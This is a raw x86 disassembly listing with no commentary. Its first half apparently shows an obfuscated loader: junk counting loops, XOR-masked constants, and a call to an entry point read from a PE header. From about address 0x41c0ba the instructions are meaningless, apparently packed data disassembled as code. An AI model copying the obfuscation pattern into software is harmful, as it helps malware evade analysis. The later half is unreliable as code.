  41bc13:	dec    edi
  41bc14:	mov    DWORD PTR ds:0x42b00c,edi
  41bc1a:	jmp    0x41bbb6
  41bc1f:	mov    DWORD PTR [ebp-0x20],eax
  41bc22:	movzx  ecx,BYTE PTR ds:0x429028
  41bc29:	xor    ecx,DWORD PTR ds:0x42c00c
  41bc2f:	mov    DWORD PTR ds:0x429028,ecx
  41bc35:	lea    eax,[ebp-0x2c]
  41bc38:	and    DWORD PTR ds:0x429004,0x0
  41bc42:	jmp    0x41bc54
  41bc47:	mov    esi,DWORD PTR ds:0x429004
  41bc4d:	inc    esi
  41bc4e:	mov    DWORD PTR ds:0x429004,esi
  41bc54:	cmp    DWORD PTR ds:0x429004,0x1e
  41bc5b:	jae    0x41bcfb
  41bc61:	cmp    DWORD PTR ds:0x429004,0x7
  41bc68:	jne    0x41bc79
  41bc6e:	push   0x5e54
  41bc73:	call   DWORD PTR ds:0x425030
  41bc79:	cmp    DWORD PTR ds:0x429004,0x6
  41bc80:	jne    0x41bc95
  41bc86:	xor    esi,esi
  41bc88:	xor    esi,DWORD PTR ds:0x429004
  41bc8e:	inc    esi
  41bc8f:	mov    DWORD PTR ds:0x429004,esi
  41bc95:	jmp    0x41bc47
  41bc9a:	and    DWORD PTR ds:0x42b00c,0x0
  41bca4:	jmp    0x41bcb6
  41bca9:	mov    esi,DWORD PTR ds:0x42b00c
  41bcaf:	inc    esi
  41bcb0:	mov    DWORD PTR ds:0x42b00c,esi
  41bcb6:	cmp    DWORD PTR ds:0x42b00c,0x12
  41bcbd:	jae    0x41bcfb
  41bcc3:	cmp    DWORD PTR ds:0x42b00c,0xc
  41bcca:	jne    0x41bcdc
  41bcd0:	push   DWORD PTR [ebp-0x10]
  41bcd3:	push   DWORD PTR [ebp-0x28]
  41bcd6:	call   DWORD PTR ds:0x425034
  41bcdc:	cmp    DWORD PTR ds:0x42b00c,0xb
  41bce3:	jne    0x41bcf6
  41bce9:	mov    esi,DWORD PTR ds:0x42b00c
  41bcef:	inc    esi
  41bcf0:	mov    DWORD PTR ds:0x42b00c,esi
  41bcf6:	jmp    0x41bca9
  41bcfb:	mov    DWORD PTR [ebp-0x1c],eax
  41bcfe:	mov    eax,ds:0x424020
  41bd03:	mov    eax,DWORD PTR [eax+0x1c8]
  41bd09:	mov    eax,DWORD PTR [eax]
  41bd0b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bd0e:	mov    esi,0x7510893
  41bd13:	xor    eax,esi
  41bd15:	mov    edi,0x3272db
  41bd1a:	add    eax,edi
  41bd1c:	mov    DWORD PTR [ecx],eax
  41bd1e:	mov    eax,ds:0x424230
  41bd23:	cmp    eax,0x301ac8f5
  41bd28:	jne    0x41bd4f
  41bd2e:	mov    eax,DWORD PTR [ebp-0x4]
  41bd31:	mov    ecx,DWORD PTR ds:0x424020
  41bd37:	mov    ecx,DWORD PTR [ecx+0x198]
  41bd3d:	xor    eax,esi
  41bd3f:	add    eax,edi
  41bd41:	mov    DWORD PTR [ecx],eax
  41bd43:	mov    eax,DWORD PTR [ebp-0x4]
  41bd46:	xor    eax,esi
  41bd48:	add    eax,edi
  41bd4a:	mov    ds:0x424230,eax
  41bd4f:	mov    eax,ds:0x424020
  41bd54:	mov    eax,DWORD PTR [eax+0x18c]
  41bd5a:	mov    eax,DWORD PTR [eax]
  41bd5c:	mov    DWORD PTR [ebp-0x30],eax
  41bd5f:	mov    eax,0xf89c85ba
  41bd64:	mov    DWORD PTR [ebp-0x1c],eax
  41bd67:	mov    DWORD PTR [ebp-0x1c],eax
  41bd6a:	mov    DWORD PTR [ebp-0x1c],eax
  41bd6d:	mov    DWORD PTR [ebp-0x1c],ebx
  41bd70:	mov    DWORD PTR [ebp-0x38],eax
  41bd73:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bd7a:	mov    ebx,DWORD PTR [ebp-0x4]
  41bd7d:	mov    ecx,DWORD PTR [ebp-0x8]
  41bd80:	mov    edx,DWORD PTR [ebp-0x8]
  41bd83:	xor    edx,esi
  41bd85:	xor    ecx,esi
  41bd87:	add    ecx,edx
  41bd89:	mov    edx,DWORD PTR [ebp-0x8]
  41bd8c:	xor    ebx,esi
  41bd8e:	xor    edx,esi
  41bd90:	add    ebx,edi
  41bd92:	lea    ecx,[ecx+edx*1+0x975891]
  41bd99:	cmp    ebx,ecx
  41bd9b:	ja     0x41bdfc
  41bda1:	mov    eax,DWORD PTR [ebp-0x8]
  41bda4:	xor    eax,esi
  41bda6:	lea    eax,[eax+ebx*1+0x3272db]
  41bdad:	push   eax
  41bdae:	mov    eax,DWORD PTR [ebp-0x1c]
  41bdb1:	xor    eax,esi
  41bdb3:	lea    eax,[ebp+eax*1+0x3272e3]
  41bdba:	push   eax
  41bdbb:	mov    eax,ds:0x424020
  41bdc0:	push   DWORD PTR [eax+0x1bc]
  41bdc6:	call   0x40843e
  41bdcb:	mov    eax,DWORD PTR [ebp-0x8]
  41bdce:	xor    eax,esi
  41bdd0:	lea    ebx,[ebx+eax*1+0x3272db]
  41bdd7:	mov    eax,DWORD PTR [ebp-0x8]
  41bdda:	mov    ecx,DWORD PTR [ebp-0x8]
  41bddd:	xor    ecx,esi
  41bddf:	xor    eax,esi
  41bde1:	add    eax,ecx
  41bde3:	mov    ecx,DWORD PTR [ebp-0x8]
  41bde6:	xor    ecx,esi
  41bde8:	lea    eax,[eax+ecx*1+0x975891]
  41bdef:	cmp    ebx,eax
  41bdf1:	jbe    0x41bda1
  41bdf7:	mov    eax,0xf89c85ba
  41bdfc:	mov    ecx,DWORD PTR [ebp+0xc]
  41bdff:	mov    DWORD PTR ds:0x423ea4,ecx
  41be05:	mov    ecx,DWORD PTR [ebp+0x10]
  41be08:	mov    DWORD PTR ds:0x4240f8,ecx
  41be0e:	mov    ecx,DWORD PTR ds:0x423ea4
  41be14:	mov    edx,DWORD PTR [ebp-0x20]
  41be17:	sub    ecx,edi
  41be19:	xor    ecx,esi
  41be1b:	mov    DWORD PTR [edx],ecx
  41be1d:	mov    edx,DWORD PTR [ebp-0xc]
  41be20:	mov    ecx,0xf89c85b6
  41be25:	cmp    edx,ecx
  41be27:	jne    0x41be52
  41be2d:	lea    eax,[ebp-0x14]
  41be30:	mov    DWORD PTR [ebp-0x24],eax
  41be33:	lea    eax,[ebp+0x4]
  41be36:	mov    DWORD PTR [ebp-0x14],eax
  41be39:	mov    eax,DWORD PTR [ebp-0x14]
  41be3c:	test   eax,eax
  41be3e:	je     0x41bf67
  41be44:	mov    eax,DWORD PTR [ebp-0x10]
  41be47:	mov    eax,DWORD PTR [ebp-0x8]
  41be4a:	lea    eax,[ebp-0x24]
  41be4d:	jmp    0x41bf5e
  41be52:	mov    edx,DWORD PTR [ebp-0x28]
  41be55:	cmp    edx,0xf89c85b5
  41be5b:	je     0x41beb8
  41be61:	mov    edx,DWORD PTR [ebp-0x4]
  41be64:	mov    ebx,DWORD PTR [ebp-0x2c]
  41be67:	xor    edx,esi
  41be69:	add    edx,edi
  41be6b:	cmp    edx,ebx
  41be6d:	je     0x41beb8
  41be73:	mov    eax,ds:0x424020
  41be78:	mov    eax,DWORD PTR [eax+0x194]
  41be7e:	mov    ecx,DWORD PTR [eax]
  41be80:	mov    eax,DWORD PTR [ecx+0x3c]
  41be83:	push   DWORD PTR ds:0x4240f8
  41be89:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41be8d:	push   DWORD PTR ds:0x423ea4
  41be93:	add    eax,ecx
  41be95:	mov    ecx,DWORD PTR ds:0x424020
  41be9b:	mov    ecx,DWORD PTR [ecx+0x194]
  41bea1:	push   DWORD PTR [ecx]
  41bea3:	call   eax
  41bea5:	mov    ecx,DWORD PTR ds:0x424020
  41beab:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41beb1:	mov    DWORD PTR [ecx],eax
  41beb3:	jmp    0x41bf67
  41beb8:	mov    edx,DWORD PTR [ebp-0x4]
  41bebb:	mov    ebx,DWORD PTR [ebp-0x30]
  41bebe:	xor    edx,esi
  41bec0:	add    edx,edi
  41bec2:	cmp    edx,ebx
  41bec4:	jne    0x41bf1d
  41beca:	mov    edx,DWORD PTR [ebp-0x4]
  41becd:	mov    ebx,DWORD PTR ds:0x424020
  41bed3:	mov    ebx,DWORD PTR [ebx+0x198]
  41bed9:	xor    edx,esi
  41bedb:	add    edx,edi
  41bedd:	cmp    edx,DWORD PTR [ebx]
  41bedf:	jne    0x41befa
  41bee5:	push   ecx
  41bee6:	mov    ecx,DWORD PTR [ebp-0x4]
  41bee9:	xor    ecx,esi
  41beeb:	add    ecx,edi
  41beed:	push   ecx
  41beee:	push   eax
  41beef:	push   DWORD PTR [ebp-0x8]
  41bef2:	push   DWORD PTR [ebp-0x4]
  41bef5:	call   0x416ab7
  41befa:	push   DWORD PTR [ebp-0x8]
  41befd:	push   DWORD PTR [ebp-0x4]
  41bf00:	call   0x41bf89
  41bf05:	mov    eax,DWORD PTR [ebp-0x4]
  41bf08:	xor    eax,esi
  41bf0a:	add    eax,edi
  41bf0c:	mov    ds:0x4240a4,eax
  41bf11:	mov    eax,DWORD PTR [ebp-0x4]
  41bf14:	xor    eax,esi
  41bf16:	add    eax,edi
  41bf18:	mov    ds:0x42409c,eax
  41bf1d:	lea    eax,[ebp-0x18]
  41bf20:	mov    DWORD PTR [ebp-0x34],eax
  41bf23:	lea    eax,[ebp+0x4]
  41bf26:	mov    DWORD PTR [ebp-0x18],eax
  41bf29:	mov    eax,DWORD PTR [ebp-0x18]
  41bf2c:	test   eax,eax
  41bf2e:	je     0x41bf67
  41bf34:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  41bf3b:	mov    DWORD PTR [ebp-0x40],0x712ed08
  41bf42:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  41bf49:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  41bf50:	call   0x411f4d
  41bf55:	mov    eax,DWORD PTR [ebp-0x10]
  41bf58:	mov    eax,DWORD PTR [ebp-0x8]
  41bf5b:	lea    eax,[ebp-0x34]
  41bf5e:	push   eax
  41bf5f:	push   DWORD PTR [ebp-0x4]
  41bf62:	call   0x40f9a6
  41bf67:	mov    eax,ds:0x424020
  41bf6c:	push   0x4
  41bf6e:	add    eax,0x1cc
  41bf73:	push   eax
  41bf74:	lea    eax,[ebp-0x10]
  41bf77:	push   eax
  41bf78:	call   0x40843e
  41bf7d:	mov    eax,DWORD PTR [ebp-0x10]
  41bf80:	mov    eax,DWORD PTR [eax]
  41bf82:	pop    edi
  41bf83:	pop    esi
  41bf84:	pop    ebx
  41bf85:	leave  
  41bf86:	ret    0xc
  41bf89:	push   ebp
  41bf8a:	mov    ebp,esp
  41bf8c:	sub    esp,0x98
  41bf92:	mov    eax,DWORD PTR [ebp+0x8]
  41bf95:	inc    ecx
  41bf96:	push   ebx
  41bf97:	sbb    DWORD PTR ds:0x42a014,edx
  41bf9d:	push   esi
  41bf9e:	add    esi,esi
  41bfa0:	push   edi
  41bfa1:	and    DWORD PTR ds:0x42c014,0x0
  41bfab:	jmp    0x41bfbd
  41bfb0:	mov    edi,DWORD PTR ds:0x42c014
  41bfb6:	inc    edi
  41bfb7:	mov    DWORD PTR ds:0x42c014,edi
  41bfbd:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bfc4:	jae    0x41c01b
  41bfca:	cmp    DWORD PTR ds:0x42c014,0xb
  41bfd1:	jne    0x41bfea
  41bfd7:	push   0x42457a
  41bfdc:	push   0x42450c
  41bfe1:	push   DWORD PTR [ebp-0x1c]
  41bfe4:	call   DWORD PTR ds:0x42503c
  41bfea:	cmp    DWORD PTR ds:0x42c014,0xa
  41bff1:	jne    0x41c004
  41bff7:	mov    edi,DWORD PTR ds:0x42c014
  41bffd:	inc    edi
  41bffe:	mov    DWORD PTR ds:0x42c014,edi
  41c004:	jmp    0x41bfb0
  41c009:	mov    esi,DWORD PTR ds:0x42c000
  41c00f:	or     esi,DWORD PTR ds:0x42a000
  41c015:	mov    DWORD PTR ds:0x42c000,esi
  41c01b:	mov    esi,0x7510893
  41c020:	xor    eax,esi
  41c022:	mov    edi,DWORD PTR ds:0x423e50
  41c028:	mov    ecx,DWORD PTR ds:0x423e6c
  41c02e:	sub    edi,ecx
  41c030:	sub    edi,DWORD PTR [edi+ecx*1]
  41c033:	mov    edi,0x3272db
  41c038:	add    eax,edi
  41c03a:	xor    ecx,0x38ef
  41c040:	mov    DWORD PTR [ebp-0x30],eax
  41c043:	mov    eax,ds:0x423ea0
  41c048:	mov    DWORD PTR ds:0x429010,0x1f
  41c052:	cmp    DWORD PTR ds:0x429010,0x0
  41c059:	je     0x41c0ad
  41c05f:	cmp    DWORD PTR ds:0x429010,0xf
  41c066:	jne    0x41c081
  41c06c:	push   0x82e0
  41c071:	push   0x7826
  41c076:	push   0x30a6
  41c07b:	call   DWORD PTR ds:0x425040
  41c081:	cmp    DWORD PTR ds:0x429010,0x10
  41c088:	jne    0x41c09b
  41c08e:	mov    ecx,DWORD PTR ds:0x429010
  41c094:	dec    ecx
  41c095:	mov    DWORD PTR ds:0x429010,ecx
  41c09b:	mov    ecx,DWORD PTR ds:0x429010
  41c0a1:	dec    ecx
  41c0a2:	mov    DWORD PTR ds:0x429010,ecx
  41c0a8:	jmp    0x41c052
  41c0ad:	mov    eax,DWORD PTR [eax]
  41c0af:	add    ecx,DWORD PTR ds:0x42a01c
  41c0b5:	jmp    0x41e403
  41c0ba:	icebp  
  41c0bb:	push   ecx
  41c0bc:	inc    edi
  41c0bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0bf:	mov    ds:0x413825ab,eax
  41c0c4:	aaa    
  41c0c5:	and    al,0x96
  41c0c7:	sbb    edx,DWORD PTR [edi]
  41c0c9:	(bad)  
  41c0ca:	and    al,0xfd
  41c0cc:	popa   
  41c0cd:	bound  edx,QWORD PTR [ecx+0x5f]
  41c0d0:	bound  esp,QWORD PTR [edx-0x33]
  41c0d3:	inc    ebp
  41c0d4:	sub    eax,0x4322c4ae
  41c0d9:	jne    0x41c0c8
  41c0db:	mov    bl,0x30
  41c0dd:	sub    eax,0x7219a475
  41c0e2:	inc    esp
  41c0e3:	adc    eax,0x97efa025
  41c0e8:	mov    eax,eax
  41c0ea:	or     eax,0xbb6ccd91
  41c0ef:	mov    ebp,0x8f91b35
  41c0f4:	inc    eax
  41c0f5:	repnz xor dh,al
  41c0f8:	inc    esi
  41c0f9:	mov    al,0x2c
  41c0fb:	lods   al,BYTE PTR ds:[esi]
  41c0fc:	cmp    dh,BYTE PTR [ebx+0x3b4d98dd]
  41c102:	nop
  41c103:	sbb    DWORD PTR [eax-0x1aa80a42],esp
  41c109:	push   0xe1174a7f
  41c10e:	bound  eax,QWORD PTR [esp+ebp*1+0x5fe1e2af]
  41c115:	jmp    0x41c137
  41c117:	scas   eax,DWORD PTR es:[edi]
  41c118:	test   BYTE PTR [ebp+0x74bca5dd],bl
  41c11e:	les    sp,DWORD PTR [edi]
  41c121:	cdq    
  41c122:	adc    DWORD PTR [esi],esp
  41c124:	popf   
  41c125:	loope  0x41c0d1
  41c127:	cmp    edx,DWORD PTR [ebx+eiz*4+0x6f5ac01b]
  41c12e:	rol    DWORD PTR [esi+0x596e07a7],1
  41c134:	cs int 0xdc
  41c137:	sbb    DWORD PTR [ebp+0x4a],eax
  41c13a:	pop    es
  41c13b:	jg     0x41c160
  41c13d:	jbe    0x41c141
  41c13f:	push   ebx
  41c140:	popa   
  41c141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c142:	les    edx,FWORD PTR [ebx-0x2]
  41c145:	cmp    dh,BYTE PTR [eax-0x6f]
  41c148:	sbb    DWORD PTR [ecx],ecx
  41c14a:	jle    0x41c0db
  41c14c:	popa   
  41c14d:	int3   
  41c14e:	jnp    0x41c1c0
  41c150:	adc    BYTE PTR [esi-0x6426ac6c],dl
  41c156:	push   edi
  41c157:	loope  0x41c14a
  41c159:	lods   eax,DWORD PTR ds:[esi]
  41c15a:	mov    edx,0x17d71772
  41c15f:	pusha  
  41c160:	loope  0x41c0f7
  41c162:	data16 out 0x9c,al
  41c165:	mov    ds:0xbcd6ddc9,al
  41c16a:	or     ecx,eax
  41c16c:	lea    edi,[esi+0x32d2b267]
  41c172:	or     ebx,DWORD PTR [ecx+0x39d7af12]
  41c178:	fist   WORD PTR [edx+eiz*2-0x3755b612]
  41c17f:	ret    0x3cd5
  41c182:	fucomp st(6)
  41c184:	ins    BYTE PTR es:[edi],dx
  41c185:	imul   edx,DWORD PTR [edi-0x40],0xffffffb0
  41c189:	in     al,0x7d
  41c18b:	adc    BYTE PTR [ebp-0x6b],ch
  41c18e:	stc    
  41c18f:	lahf   
  41c190:	mov    BYTE PTR [esi],bh
  41c192:	out    dx,eax
  41c193:	dec    esi
  41c194:	hlt    
  41c195:	ret    
  41c196:	imul   ecx,DWORD PTR [edx-0x42f9b77b],0xd44b1daf
  41c1a0:	mov    ebp,0x2130e4d8
  41c1a5:	inc    ecx
  41c1a6:	add    al,ch
  41c1a8:	(bad)  
  41c1a9:	std    
  41c1aa:	scas   al,BYTE PTR es:[edi]
  41c1ab:	loope  0x41c1bc
  41c1ad:	add    BYTE PTR [esi+0x2dfd704a],ah
  41c1b3:	test   ah,cl
  41c1b5:	cld    
  41c1b6:	pop    edx
  41c1b7:	inc    esi
  41c1b8:	jmp    0x281e:0xdf762780
  41c1bf:	retf   
  41c1c0:	lahf   
  41c1c1:	bound  eax,QWORD PTR [edi-0x76573be6]
  41c1c7:	mov    dl,0x48
  41c1c9:	mov    WORD PTR [eax],?
  41c1cb:	imul   eax,DWORD PTR [ecx-0x22],0x1e
  41c1cf:	adc    eax,0x6eccc643
  41c1d4:	xor    BYTE PTR ds:0x7fed3005,0xcf
  41c1db:	add    BYTE PTR [eax+0x3436a687],bl
  41c1e1:	mov    cl,BYTE PTR [eax+0x7]
  41c1e4:	sahf   
  41c1e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1e6:	neg    BYTE PTR [eax]
  41c1e8:	add    BYTE PTR [ebp+0x4c],dh
  41c1eb:	les    eax,FWORD PTR [edi+0x1a4f9ff3]
  41c1f1:	cmp    ebx,esp
  41c1f3:	jb     0x41c242
  41c1f5:	cmp    ebp,ebx
  41c1f7:	mov    ebx,0x635be42f
  41c1fc:	idiv   BYTE PTR [ecx+0x44]
  41c1ff:	pop    esp
  41c200:	mov    dl,dl
  41c202:	popa   
  41c203:	cs (bad) 
  41c205:	mov    al,ds:0xf7313e19
  41c20a:	or     al,0xd0
  41c20c:	xchg   ebp,eax
  41c20d:	(bad)  
  41c20e:	ds and al,0x1c
  41c211:	stos   BYTE PTR es:[edi],al
  41c212:	call   0xc060:0xf649eda1
  41c219:	fsub   st(1),st
  41c21b:	out    0x6f,al
  41c21d:	xchg   ebx,eax
  41c21e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c21f:	mov    ah,0x87
  41c221:	push   es
  41c222:	cmp    BYTE PTR [esi],0x23
  41c225:	cmp    DWORD PTR [edx],edi
  41c227:	push   0x14684052
  41c22c:	popa   
  41c22d:	adc    al,0x87
  41c22f:	mov    eax,0x36648bc4
  41c234:	dec    ebx
  41c235:	daa    
  41c236:	aam    0x0
  41c238:	aaa    
  41c239:	cdq    
  41c23a:	dec    ebp
  41c23b:	out    0x3,eax
  41c23d:	mov    bh,0x80
  41c23f:	jl     0x41c23c
  41c241:	adc    eax,0x40946742
  41c246:	mov    WORD PTR [ebx-0x5d134e3f],cs
  41c24c:	mov    bh,0x29
  41c24e:	daa    
  41c24f:	out    dx,al
  41c250:	imul   ecx,DWORD PTR [ebx-0x4e],0x68
  41c254:	sub    DWORD PTR [eax],edx
  41c256:	imul   DWORD PTR [esi]
  41c258:	cmc    
  41c259:	in     eax,0xdf
  41c25b:	fild   QWORD PTR [edx+0x54010258]
  41c261:	adc    DWORD PTR [ebp-0x410a5f70],ebp
  41c267:	jecxz  0x41c292
  41c269:	stc    
  41c26a:	add    cl,al
  41c26c:	adc    al,0xe0
  41c26e:	enter  0xbfd0,0x90
  41c272:	pop    ecx
  41c273:	into   
  41c274:	sub    dl,BYTE PTR [ecx-0x50]
  41c277:	(bad)  
  41c278:	movzx  ebp,WORD PTR [eax+0x44]
  41c27c:	fist   DWORD PTR [eax+0x40]
  41c27f:	mov    al,ds:0x81aa509f
  41c284:	xchg   ebx,eax
  41c285:	dec    edx
  41c286:	call   0xad2e:0x1f7fdc18
  41c28d:	daa    
  41c28e:	pop    esi
  41c28f:	and    al,0xc4
  41c291:	adc    BYTE PTR [ecx-0x4e],ah
  41c294:	add    DWORD PTR [ebp+0x61],edx
  41c297:	iret   
  41c298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c299:	cmp    eax,edi
  41c29b:	push   ecx
  41c29c:	push   eax
  41c29d:	lods   al,BYTE PTR ds:[esi]
  41c29e:	(bad)  
  41c29f:	pop    ss
  41c2a0:	sbb    eax,0xe0f4cf39
  41c2a5:	inc    edi
  41c2a6:	cmp    eax,0x21e8af18
  41c2ab:	mov    WORD PTR [eax-0x5e],cs
  41c2ae:	imul   esi,DWORD PTR [eax+0xc470608],0x49aab813
  41c2b8:	cmp    eax,0x79c0346f
  41c2bd:	outs   dx,DWORD PTR ds:[esi]
  41c2be:	pop    ss
  41c2bf:	mov    ebp,0x1b5846a5
  41c2c4:	test   DWORD PTR gs:[edi-0x6291db5c],ebx
  41c2cb:	jne    0x41c32f
  41c2cd:	mov    bh,0x12
  41c2cf:	pop    ds
  41c2d0:	cmp    BYTE PTR [edi],0xe7
  41c2d3:	ror    DWORD PTR ds:0x48df7932,cl
  41c2d9:	push   ecx
  41c2da:	jmp    0x41c2b7
  41c2dc:	icebp  
  41c2dd:	sbb    al,0x7b
  41c2df:	rcr    BYTE PTR [edi-0x40],1
  41c2e2:	aad    0x10
  41c2e4:	sbb    eax,0x4a278eda
  41c2e9:	(bad)  
  41c2ea:	std    
  41c2eb:	aam    0x6e
  41c2ed:	ficomp WORD PTR [ebx-0x5d]
  41c2f0:	data16 aas 
  41c2f2:	xchg   edx,eax
  41c2f3:	sub    al,0xd0
  41c2f5:	pop    es
  41c2f6:	test   BYTE PTR [ebp+0x16e43f83],0xc9
  41c2fd:	xchg   ebx,eax
  41c2fe:	xor    eax,0x120b41cd
  41c303:	cli    
  41c304:	mov    dh,0x57
  41c306:	out    0x3e,eax
  41c308:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c30a:	jb     0x41c37f
  41c30c:	je     0x41c383
  41c30e:	mov    dh,0x74
  41c310:	xlat   BYTE PTR ds:[ebx]
  41c311:	cmp    DWORD PTR [edi],0xcda808fb
  41c317:	and    BYTE PTR [esi-0x53],ah
  41c31a:	jb     0x41c363
  41c31c:	or     esp,DWORD PTR [edi]
  41c31e:	and    al,0x60
  41c320:	fwait
  41c321:	inc    ecx
  41c322:	sub    DWORD PTR [eax],edx
  41c324:	bound  ebx,QWORD PTR [edx+0x21]
  41c327:	aaa    
  41c328:	ss (bad) 
  41c32a:	hlt    
  41c32b:	ins    BYTE PTR es:[edi],dx
  41c32c:	imul   ebp,DWORD PTR [ecx+0x6d],0xffffff96
  41c330:	repnz push ebp
  41c332:	push   eax
  41c334:	(bad)  
  41c335:	push   ebp
  41c336:	clc    
  41c337:	icebp  
  41c338:	inc    edi
  41c339:	cld    
  41c33a:	push   ecx
  41c33b:	test   al,0x8d
  41c33d:	adc    DWORD PTR [edx+0x2ebda555],esp
  41c343:	ss cmp eax,0x12c52bc0
  41c349:	xor    esp,DWORD PTR [eax-0xc]
  41c34c:	stc    
  41c34d:	std    
  41c34e:	(bad)  
  41c34f:	mov    esi,DWORD PTR [esi-0x6cd3e22d]
  41c355:	test   DWORD PTR [ecx*1+0x6fcdc022],eax
  41c35c:	sbb    ebx,0xc05b4bbe
  41c362:	xor    cl,0xbd
  41c365:	jge    0x41c2ee
  41c367:	aad    0x70
  41c369:	rcr    BYTE PTR [edx],1
  41c36b:	and    dh,BYTE PTR [eax]
  41c36d:	jl     0x41c386
  41c36f:	and    eax,0x87c3e878
  41c374:	retf   0xdd6b
  41c377:	daa    
  41c378:	lods   eax,DWORD PTR ds:[esi]
  41c379:	sbb    dl,BYTE PTR ds:0x999d1227
  41c37f:	push   0x9331b854
  41c384:	cdq    
  41c385:	out    0xfb,eax
  41c387:	jp     0x41c405
  41c389:	lock dec ebx
  41c38b:	mov    bl,0x72
  41c38d:	push   edx
  41c38e:	or     DWORD PTR [edi+eiz*2],ecx
  41c391:	dec    edi
  41c392:	and    edx,DWORD PTR [edi+0x6820781a]
  41c398:	std    
  41c399:	and    al,0x90
  41c39b:	mov    ss,esi
  41c39d:	sub    al,0xdf
  41c39f:	inc    edx
  41c3a0:	arpl   bp,bx
  41c3a2:	popf   
  41c3a3:	push   cs
  41c3a4:	lds    esp,FWORD PTR [edx]
  41c3a6:	test   al,0x51
  41c3a8:	int    0x87
  41c3aa:	call   0xc2e:0x37dc4e71
  41c3b1:	sbb    al,0xe9
  41c3b3:	xor    BYTE PTR [ecx-0x3c],al
  41c3b6:	icebp  
  41c3b7:	push   ebp
  41c3b8:	inc    ebx
  41c3b9:	stos   BYTE PTR es:[edi],al
  41c3ba:	pop    eax
  41c3bb:	xchg   edx,eax
  41c3bc:	push   ebx
  41c3bd:	repnz call 0xeb45:0xaf2566ff
  41c3c5:	gs scas eax,DWORD PTR es:[edi]
  41c3c7:	stc    
  41c3c8:	adc    eax,0x2cc71817
  41c3cd:	idiv   edx
  41c3cf:	stos   BYTE PTR es:[edi],al
  41c3d0:	mov    ds:0x317e8f71,al
  41c3d5:	jno    0x41c3d0
  41c3d7:	lods   eax,DWORD PTR ds:[esi]
  41c3d8:	sar    BYTE PTR [ecx+esi*2-0x73353c21],1
  41c3df:	mov    bh,0xa0
  41c3e1:	sub    al,0xfe
  41c3e3:	xchg   ebp,eax
  41c3e4:	outs   dx,BYTE PTR ds:[esi]
  41c3e5:	pop    ss
  41c3e6:	adc    ebx,DWORD PTR [edx+edx*1+0x5f3d335b]
  41c3ed:	sub    al,0xfb
  41c3ef:	jnp    0x41c415
  41c3f1:	pop    ebx
  41c3f2:	xor    eax,0x2dd184e7
  41c3f7:	jl     0x41c3ac
  41c3f9:	retf   
  41c3fa:	cwde   
  41c3fb:	clc    
  41c3fc:	fsub   DWORD PTR [eax]
  41c3fe:	xor    DWORD PTR [eax],edx
  41c400:	call   0xd1ed8c96
  41c405:	ins    DWORD PTR es:[edi],dx
  41c406:	int    0xca
  41c408:	pop    ss
  41c409:	test   BYTE PTR [eax],al
  41c40b:	mov    ds:0x40d84d2b,al
  41c410:	lods   eax,DWORD PTR ds:[esi]
  41c411:	test   BYTE PTR [edx+0x4c],0x6a
  41c415:	jecxz  0x41c3cf
  41c417:	rol    BYTE PTR [ecx],1
  41c419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c41a:	mov    esp,0x61a09106
  41c41f:	add    DWORD PTR [eax-0x6e26bbe6],0x7894cf5a
  41c429:	stos   DWORD PTR es:[edi],eax
  41c42a:	cs push esp
  41c42c:	pop    ecx
  41c42d:	int3   
  41c42e:	(bad)  
  41c430:	loop   0x41c46a
  41c432:	mov    ebp,0x2ecb2a7f
  41c437:	popf   
  41c438:	xor    DWORD PTR [ebx-0x2d0caa5d],ecx
  41c43e:	fxch   st(7)
  41c440:	rcr    BYTE PTR [ebp-0x1c9c3da8],1
  41c446:	ds jmp 0x52ac:0xe75647c8
  41c44e:	aas    
  41c44f:	xlat   BYTE PTR ds:[ebx]
  41c450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c451:	pushf  
  41c452:	jb     0x41c42b
  41c454:	stc    
  41c455:	or     esi,ebp
  41c457:	mov    esi,0xde4135d0
  41c45c:	out    0x5f,eax
  41c45e:	call   0x3b8e:0xbea3850
  41c465:	add    BYTE PTR [esi+0x33915582],ch
  41c46b:	and    dh,BYTE PTR [ebp+ebx*8-0x338c9051]
  41c472:	inc    esp
  41c473:	jl     0x41c421
  41c475:	jo     0x41c4a2
  41c477:	xlat   BYTE PTR ds:[ebx]
  41c478:	je     0x41c49f
  41c47a:	sub    bl,BYTE PTR [esi]
  41c47c:	sar    DWORD PTR es:[esi+eiz*2-0x37915380],cl
  41c484:	data16 mov bl,0xc
  41c487:	(bad)  
  41c488:	xor    dh,BYTE PTR [ecx+0x271268ae]
  41c48e:	push   edi
  41c48f:	cmp    BYTE PTR [eax+0x4e],0xf5
  41c493:	adc    DWORD PTR [edi],edi
  41c495:	jo     0x41c4d4
  41c497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c498:	and    ebx,DWORD PTR [ebx+ebp*1+0x38]
  41c49c:	cmp    BYTE PTR [eax],ch
  41c49e:	dec    esi
  41c49f:	rol    BYTE PTR [ebx+eiz*4],0x7a
  41c4a3:	mov    esp,0xf519ddf7
  41c4a8:	pop    ds
  41c4a9:	nop
  41c4aa:	xchg   DWORD PTR [eax+0x3f32d0cb],edx
  41c4b0:	push   ecx
  41c4b1:	add    BYTE PTR [edi+0x67],cl
  41c4b4:	enter  0x3221,0x78
  41c4b8:	shl    DWORD PTR [ecx-0x5ec25e92],0xeb
  41c4bf:	mov    edx,0x9a791148
  41c4c4:	test   DWORD PTR [ecx+0x11db4a7d],ebp
  41c4ca:	loopne 0x41c4bb
  41c4cc:	jb     0x41c51c
  41c4ce:	dec    esi
  41c4cf:	cwde   
  41c4d0:	pusha  
  41c4d1:	adc    bh,BYTE PTR [ecx]
